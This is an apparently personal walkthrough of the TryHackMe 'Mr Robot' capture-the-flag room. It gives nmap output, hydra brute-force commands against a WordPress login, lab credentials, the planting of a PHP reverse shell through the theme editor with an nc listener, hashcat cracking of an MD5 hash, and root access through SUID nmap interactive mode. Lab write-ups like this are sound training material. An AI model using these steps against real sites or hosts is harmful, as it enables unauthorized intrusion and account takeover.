[Mr Robot CTF](https://tryhackme.com/room/mrrobot)
===============

Way better guide: https://medium.com/bugbountywriteup/tryhackme-mr-robot-ctf-writeup-ff0b3be5bd18

Tasks
----------------------

1. [ Connect to our network ](#connect)
2. [ Hack the machine ](#hack)

<a name="connect"></a>
## 1. Connect to our network

```
IP=XXX
```

<a name="hack"></a>
## 2. Hack the machine

#Recon
nmap results:

```
# Nmap 7.80 scan initiated Sun Jul 19 11:15:39 2020 as: nmap -sC -sV -oN nmap/output.txt -vvv XXX
Nmap scan report for XXX
Host is up, received syn-ack (0.024s latency).
Scanned at 2020-07-19 11:15:39 CEST for 42s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT    STATE  SERVICE  REASON       VERSION
22/tcp  closed ssh      conn-refused
80/tcp  open   http     syn-ack      Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http syn-ack      Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 19 11:16:21 2020 -- 1 IP address (1 host up) scanned in 42.36 seconds
```

Running gobuster over the website reveals a wordpress blog with a login page at `/wp-login.php` and the `/robots.txt` reveals the location of the first key at `/key--of-3.txt` and the location of a wordlist at `/fsocity.dic` (mind the typo?).

The wordlist can be sorted wth `sort` and duplicates can be removed with `uniq`. 

# Access WordPress

We need to bruteforce the login with the wordlist. `WPscan` looks like a nice tool for this job but I'm getting prompted to sign up and I don't want to. With hydra I managed to use the wordlist to first check for a good username:

`hydra -V -L fsocity.dic -p 123 $IP http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
`

`Elliot` was first found, now trying to get his password with the same wordlist:

`hydra -V -l Elliot -P wordlist.dic $IP http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Location' -I`

Wordpress credentials:
`
Elliot
ER28-0652
`

# Access system

Log into WordPress and edit one of the archive.php or 404.php pages in the editor (`Appearance -> Editor`). Here paste a php reverse shell, listen in (`nc -lnv 9000`) and activate it by going to the URL:

`http://10.10.162.7/wp-content/themes/twentyfifteen/404.php`

We are greeted with an unstable shell as usual: `import pty; pty.spawn("/bin/bash")` for a better experience

# PrivEsc

Once in there is a key-2-of-3.txt but we lack permissions. There is a password hash (MD5)for a user called robot.

With hashcat it is quickly found, I dont know why I didnt use the fsociety wordlist here but the password is probably also in that one.

`sudo hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/Leaked-Databases/*`

`su robot` to switch user

# Root

`find / -perm /4000 -print 2>dev/null`

or

`sudo -l`

to find permissions of the robot user. 

Apparently `nmap` is here the good one: 

`nmap --interactive`

`!sh` to get root privileges

